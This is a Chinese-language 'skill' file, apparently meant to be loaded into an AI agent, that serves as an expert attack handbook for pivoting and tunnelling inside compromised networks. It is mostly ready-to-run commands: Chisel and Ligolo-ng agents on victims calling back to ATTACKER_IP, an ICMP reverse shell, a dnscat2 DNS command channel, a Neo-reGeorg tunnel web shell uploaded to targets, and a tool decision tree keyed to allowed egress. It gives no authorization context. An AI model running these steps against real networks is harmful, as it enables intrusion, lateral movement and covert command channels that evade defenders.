# 技能：隧道与渗透——专家级攻击手册

> **AI 加载指令**：专家级隧道与渗透技术。涵盖 SSH 端口转发（本地/远程/动态/跳转）、Chisel 反向 SOCKS、Ligolo-ng 透明 TUN 渗透、socat 中继、DNS/ICMP/HTTP 隧道、ProxyChains 配置、Windows 渗透（netsh/plink），以及多层链式攻击。基础模型缺乏出口感知工具选择和透明路由设置。

## 0. 相关路由

深入之前，考虑加载：

- [网络协议攻击](../network-protocol-attacks/SKILL.md) 用于从渗透点发起网络级攻击
- [反向 Shell 技术](../reverse-shell-techniques/SKILL.md) 用于建立初始访问 Shell
- [未授权访问常见服务](../unauthorized-access-common-services/SKILL.md) 用于利用通过渗透发现的服务
- 渗透到新主机后，参考 [Linux 权限提升](../linux-privilege-escalation/SKILL.md) 或 [Windows 权限提升](../windows-privilege-escalation/SKILL.md)

---

## 1. SSH 隧道

### 本地端口转发

通过渗透点将本地端口转发到远程服务。

```bash
# 通过 localhost:3306 访问 INTERNAL_HOST:3306
ssh -L 3306:INTERNAL_HOST:3306 user@PIVOT -N

# 访问内部 Web 应用
ssh -L 8080:10.10.10.100:80 user@PIVOT -N
# 浏览：http://localhost:8080

# 绑定到所有接口（与队友共享）
ssh -L 0.0.0.0:8080:INTERNAL:80 user@PIVOT -N
```

### 远程端口转发

将本地服务暴露到渗透点主机网络。

```bash
# 使攻击者的端口 8000 在渗透点作为 pivot:9000 可访问
ssh -R 9000:127.0.0.1:8000 user@PIVOT -N

# 将攻击者的监听器暴露到内部网络
ssh -R 0.0.0.0:4444:127.0.0.1:4444 user@PIVOT -N
# 内部主机连接到 PIVOT:4444 → 到达攻击者:4444
```

### 动态端口转发（SOCKS 代理）

```bash
# 在 localhost:1080 创建 SOCKS4/5 代理
ssh -D 1080 user@PIVOT -N

# 与 proxychains 结合使用
echo "socks5 127.0.0.1 1080" >> /etc/proxychains4.conf
proxychains nmap -sT -Pn -p 80,443,445 INTERNAL_SUBNET/24

# 或与浏览器 SOCKS 代理结合 → 浏览内部 Web 应用
```

### 跳转主机（ProxyJump）

```bash
# 单跳转
ssh -J jumphost user@TARGET

# 多跳转
ssh -J jump1,jump2 user@TARGET

# SSH 配置用于持久跳转
# ~/.ssh/config
Host internal-target
    HostName 10.10.10.100
    User admin
    ProxyJump user@jumphost.example.com
```

---

## 2. CHISEL

### 反向 SOCKS 代理（最常用）

```bash
# 攻击者：启动 chisel 服务器
chisel server --reverse --port 8080

# 受害者：作为客户端连接回，创建反向 SOCKS
chisel client ATTACKER_IP:8080 R:socks

# 结果：攻击者 127.0.0.1:1080 的 SOCKS5 代理
proxychains nmap -sT -Pn INTERNAL/24
```

### 端口转发

```bash
# 转发特定端口
chisel client ATTACKER:8080 R:3306:INTERNAL_DB:3306

# 多个转发
chisel client ATTACKER:8080 R:3306:DB:3306 R:8080:WEB:80

# 反向端口转发（将攻击者服务暴露到受害者网络）
chisel client ATTACKER:8080 R:0.0.0.0:4444:127.0.0.1:4444
```

---

## 3. LIGOLO-NG

基于 TUN 接口的渗透——无需 SOCKS 的透明路由。

```bash
# 攻击者：启动代理
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
ligolo-proxy -selfcert -laddr 0.0.0.0:11601

# 代理（受害者）：连接到代理
ligolo-agent -connect ATTACKER_IP:11601 -ignore-cert

# 在 ligolo-proxy 控制台中：
>> session                    # 选择代理会话
>> ifconfig                   # 查看代理的网络接口
>> start                      # 启动隧道

# 在攻击者上添加路由以到达内部网络
sudo ip route add 10.10.10.0/24 dev ligolo
sudo ip route add 172.16.0.0/16 dev ligolo
```

### 监听器（通过渗透点捕获反向 Shell）

```bash
# 在 ligolo-proxy 控制台中：
>> listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp
# 内部主机连接到 AGENT:4444 → 转发到攻击者:4444
```

### 双重渗透

```bash
# DMZ 上的代理 1 → 隧道到内部网络 1
# 内部网络 1 上的代理 2 → 隧道到内部网络 2
# 在攻击者上添加两个网络的路由
sudo ip route add 10.0.0.0/24 dev ligolo    # 通过代理 1
sudo ip route add 172.16.0.0/24 dev ligolo  # 通过代理 2
```

---

## 4. SOCAT

```bash
# TCP 端口转发
socat TCP-LISTEN:8080,fork TCP:INTERNAL:80

# UDP 中继
socat UDP-LISTEN:53,fork UDP:INTERNAL_DNS:53

# 加密隧道
socat OPENSSL-LISTEN:443,cert=server.pem,verify=0,fork TCP:INTERNAL:80

# 通过 socat 文件传输
# 接收者：
socat TCP-LISTEN:9999,fork file:received_file,create
# 发送者：
socat TCP:RECEIVER:9999 file:send_file
```

---

## 5. PROXYCHAINS / PROXIFIER

### ProxyChains 配置

```ini
# /etc/proxychains4.conf
strict_chain          # 任何代理中断时失败
# dynamic_chain       # 跳过失效代理
# random_chain        # 随机化代理顺序

[ProxyList]
socks5 127.0.0.1 1080        # 第一跳（SSH 动态转发）
socks5 127.0.0.1 1081        # 第二跳（如果链式）
```

```bash
# 使用
proxychains nmap -sT -Pn -p 22,80,445 10.10.10.0/24
proxychains crackmapexec smb 10.10.10.0/24
proxychains evil-winrm -i 10.10.10.50 -u admin -p pass
```

---

## 6. Windows 渗透

### Netsh 端口转发

```cmd
:: 转发端口（需要管理员权限）
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=INTERNAL_IP

:: 列出转发
netsh interface portproxy show all

:: 删除
netsh interface portproxy delete v4tov4 listenport=8080 listenaddress=0.0.0.0
```

### Plink（PuTTY CLI）

```cmd
:: 动态 SOCKS（类似 ssh -D）
plink.exe -ssh -D 1080 -N user@ATTACKER

:: 远程端口转发
plink.exe -ssh -R 4444:127.0.0.1:4444 user@ATTACKER

:: 自动化（非交互式，接受主机密钥）
echo y | plink.exe -ssh -l user -pw password -R 9050:127.0.0.1:9050 ATTACKER
```

---

## 7. DNS 隧道

```bash
# iodine — DNS over IP
# 服务器（攻击者，具有指向攻击者的 NS 记录）：
iodined -f -c -P password 10.0.0.1 t1.yourdomain.com

# 客户端（受害者）：
iodine -f -P password t1.yourdomain.com
# 创建 dns0 接口 → 通过它路由流量

# dnscat2 — DNS 上的命令通道
# 服务器：
ruby dnscat2.rb yourdomain.com
# 客户端：
./dnscat --dns=server=ATTACKER,port=53 --secret=SHARED_SECRET
```

---

## 8. ICMP 隧道

```bash
# icmpsh — ICMP 反向 Shell（Windows 受害者无需原始套接字）
# 攻击者：
sysctl -w net.ipv4.icmp_echo_ignore_all=1
python3 icmpsh_m.py ATTACKER_IP VICTIM_IP

# 受害者（Windows）：
icmpsh.exe -t ATTACKER_IP

# ptunnel-ng — ICMP over TCP
# 服务器：
ptunnel-ng -r INTERNAL_HOST -R 22
# 客户端：
ptunnel-ng -p PIVOT_IP -l 2222 -r INTERNAL_HOST -R 22
ssh -p 2222 user@127.0.0.1
```

---

## 9. HTTP 隧道

```bash
# Neo-reGeorg — 通过 Web Shell 的 SOCKS 代理
# 生成隧道 Web Shell：
python3 neoreg.py generate -k PASSWORD

# 上传 tunnel.php/aspx/jsp 到目标 Web 服务器

# 连接：
python3 neoreg.py -k PASSWORD -u http://TARGET/tunnel.php
# 127.0.0.1:1080 的 SOCKS 代理

# Tunna — HTTP 隧道（替代方案）
python2 proxy.py -u http://TARGET/conn.php -l 4444 -r 3389 -a INTERNAL_IP
```

---

## 10. 渗透决策矩阵

| 允许出口 | 工具 | 备注 |
|---|---|---|
| TCP 出口（任何端口） | Chisel, Ligolo-ng, SSH | 最快设置 |
| TCP 80/443 仅限 | Chisel (HTTP/S), Neo-reGeorg | 与 Web 流量融合 |
| DNS 仅限（53/udp） | iodine, dnscat2 | 慢但隐蔽 |
| ICMP 仅限 | ptunnel-ng, icmpsh | 非常受限的环境 |
| 无出口 | 绑定 Shell + 端口转发在 | 需要到渗透点的入站访问 |
| Web Shell 仅限 | Neo-reGeorg, Tunna | 当只有 HTTP 文件上传可行时 |

---

## 11. 决策树

```
已渗透主机 — 需要到达内部网络
│
├── 能在渗透点上安装工具？
│   ├── 是 + 出口 TCP 允许？
│   │   ├── 需要透明路由？→ Ligolo-ng (§3)
│   │   ├── 需要 SOCKS 代理？→ Chisel 反向 SOCKS (§2)
│   │   └── SSH 可用？→ SSH 动态转发 (§1)
│   │
│   ├── 是 + 仅 HTTP(S) 出口？
│   │   ├── Chisel over HTTPS (§2)
│   │   └── 上传 Web 隧道 → Neo-reGeorg (§9)
│   │
│   ├── 是 + 仅 DNS 出口？
│   │   └── iodine 或 dnscat2 (§7)
│   │
│   └── 是 + 仅 ICMP 允许？
│       └── ptunnel-ng 或 icmpsh (§8)
│
├── 无法安装工具（仅 Web Shell）？
│   └── Neo-reGeorg / Tunna 通过 Web Shell (§9)
│
├── Windows 渗透？
│   ├── 管理员访问？→ netsh portproxy (§6)
│   ├── SSH 客户端可用？→ ssh.exe (Windows 10+) (§1)
│   └── 出口 SSH？→ plink (§6)
│
├── 需要多层渗透？
│   ├── Ligolo-ng: 多个代理 + 路由堆叠 (§3)
│   ├── SSH ProxyJump 链式 (§1)
│   └── ProxyChains 与多个 SOCKS (§5)
│
└── 队友也需要访问？
    ├── 在 0.0.0.0 绑定 SOCKS (ssh -L 0.0.0.0:...)
    └── 通过公共代理共享 Ligolo-ng 路由
```
